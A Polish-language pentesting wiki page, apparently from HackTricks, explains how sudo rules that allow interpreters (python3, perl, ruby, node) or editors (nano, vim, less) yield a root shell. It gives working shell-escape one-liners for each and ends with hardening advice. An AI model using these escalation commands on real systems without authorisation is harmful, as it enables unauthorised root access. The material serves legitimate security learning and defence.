# Nadużywanie poleceń Sudo

{{#include ../../banners/hacktricks-training.md}}

## Interpretery dozwolone przez Sudo

Jeśli `sudo -l` umożliwia użytkownikowi uruchomienie interpretera jako root, należy traktować to jako bezpośrednie wykonywanie kodu. Interpretery są przeznaczone do wykonywania dowolnego kodu, dlatego reguła zezwalająca na użycie `python3`, `perl`, `ruby`, `lua`, `node` lub podobnych plików binarnych jest zwykle równoważna wykonywaniu poleceń jako root, chyba że argumenty są ściśle ograniczone i walidowane.

Typowy przebieg analizy:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Inne przykłady interpreterów:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Dokładna ścieżka ma znaczenie. Jeśli reguła sudo zezwala na `/usr/bin/python3`, podczas walidacji użyj dokładnie tej ścieżki:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Edytory dozwolone przez Sudo

Jeśli `sudo -l` pozwala użytkownikowi uruchomić interaktywny edytor jako root, traktuj to jako powierzchnię command-execution, a nie nieszkodliwe uprawnienie do edycji plików. Edytory często umożliwiają wykonywanie shell commands, odczytywanie dowolnych plików, zapisywanie dowolnych plików lub wywoływanie zewnętrznych helperów z poziomu edytora.

Typowy przebieg analizy:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Wykonywanie poleceń w Nano

Jeśli `nano` jest dozwolone przez sudo, wykonywanie poleceń może być dostępne z poziomu interfejsu edytora:
```text
Ctrl+R
Ctrl+X
```
Następnie podaj polecenie, takie jak:
```bash
id
/bin/sh
```
Na niektórych terminalach interaktywna powłoka może wymagać przekierowania standardowych strumieni:
```bash
reset; /bin/sh 1>&0 2>&0
```
Dokładna sekwencja klawiszy może się różnić w zależności od wersji nano i opcji kompilacji, ale problem bezpieczeństwa pozostaje ten sam: edytor działa jako root i może uruchamiać zewnętrzne polecenia.

### Inne typowe wyjścia z edytora

Edytory w stylu Vim często udostępniają wykonywanie poleceń za pośrednictwem `:!`:
```text
:!/bin/sh
```
Programy stronicujące, takie jak `less`, mogą również umożliwiać wykonywanie poleceń powłoki:
```text
!/bin/sh
```
## Uwagi dotyczące ochrony

- Unikaj udostępniania interpreterów lub interaktywnych edytorów za pośrednictwem sudo.
- Preferuj stałe wrappery należące do użytkownika root, które wykonują jedno wąsko określone działanie administracyjne.
- Jeśli interpreter jest nieunikniony, ogranicz dokładną ścieżkę skryptu i zablokuj argumenty kontrolowane przez użytkownika, zapisywalne importy, `PYTHONPATH` oraz niebezpieczne zachowywanie środowiska.
- Jeśli wymagana jest edycja plików, ogranicz dokładną ścieżkę pliku i rozważ użycie `sudoedit` z poprawionymi wersjami sudo oraz ścisłym zarządzaniem środowiskiem.
- Sprawdź `SETENV`, `env_keep`, zapisywalne katalogi robocze, zapisywalne ścieżki modułów/importów, `NOEXEC`, `use_pty` oraz logowanie, ale nie traktuj ich jako kompletnego sandboxa.
{{#include ../../banners/hacktricks-training.md}}
